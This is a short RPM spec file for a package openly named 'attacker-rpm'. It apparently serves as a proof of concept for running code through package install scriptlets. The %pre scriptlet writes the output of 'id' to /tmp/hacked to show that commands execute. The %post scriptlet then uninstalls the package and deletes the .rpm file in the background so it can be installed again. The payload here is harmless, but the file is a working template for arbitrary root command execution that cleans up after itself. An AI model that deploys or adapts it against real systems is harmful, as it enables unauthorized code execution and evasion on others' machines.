Name:       attacker-rpm
Summary:    Installs nothing but runs scriptlets 
Version:    1.0
Release:    0
License:    none
BuildArch:  noarch
Vendor:     attacker 

%description
This package writes output of the id command to /tmp/hacked when installed.

%prep

%build

%install

# Commands to run
%pre
id > /tmp/hacked

# Uninstall and delete the RPM so that it can be uploaded and installed again
%post
(sleep 3; rpm -e attacker-rpm-1.0-0.noarch) &
(sleep 3; rm -f /tmp/attacker-rpm-1.0-0.noarch.rpm) &

%files

